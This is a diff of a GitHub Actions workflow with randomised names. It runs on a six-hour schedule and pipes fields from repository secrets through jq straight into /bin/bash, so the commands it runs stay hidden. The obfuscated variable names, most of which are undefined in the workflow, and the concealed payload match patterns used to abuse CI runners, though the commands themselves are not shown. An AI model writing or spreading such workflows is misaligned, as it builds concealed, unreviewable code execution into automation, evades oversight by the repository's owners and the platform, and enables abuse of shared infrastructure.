@@ -1,34 +1,22 @@
 name: liruocong3232
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 0/6 * * *'
+    - cron: '31 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liruocong3232
         env:
-          nd07915: ${{ secrets.nd07915 }}
+          lol97: ${{ secrets.lol97 }}
         run: |
-          echo $nd07915 | jq -r .giom82669 | /bin/bash
-          echo $m8278 | jq -r .hexfq1573 | /bin/bash
-          echo $imv0384 | jq -r .upse15 | /bin/bash
-          echo $dm59 | jq -r .ltvo60006 | /bin/bash
-          echo $gf2992 | jq -r .bnvmy212 | /bin/bash
-          echo $d97 | jq -r .kgta2553 | /bin/bash
-          echo $cjgn81 | jq -r .caab6 | /bin/bash
-          echo $nm62 | jq -r .cg052 | /bin/bash
-          echo $fdwz43 | jq -r .qz355 | /bin/bash
-          echo $tfave80 | jq -r .wya55 | /bin/bash
-          echo $yd93 | jq -r .vjiz946 | /bin/bash
-          echo $ax6 | jq -r .gzl108 | /bin/bash
-          echo $ureka13517 | jq -r .qw328 | /bin/bash
-          echo $pwuwe496 | jq -r .jabj74801 | /bin/bash
-          echo $jvja29 | jq -r .es69 | /bin/bash
-          echo $egvm36174 | jq -r .v37 | /bin/bash
-          echo $pd5 | jq -r .clq65023 | /bin/bash
+          echo $lol97 | jq -r .f27892 | /bin/bash
+          echo $i56590 | jq -r .z3330 | /bin/bash
+          echo $fjah7 | jq -r .x2 | /bin/bash
+          echo $gfgpy18 | jq -r .zo6984 | /bin/bash
+          echo $dj826 | jq -r .t55 | /bin/bash
 
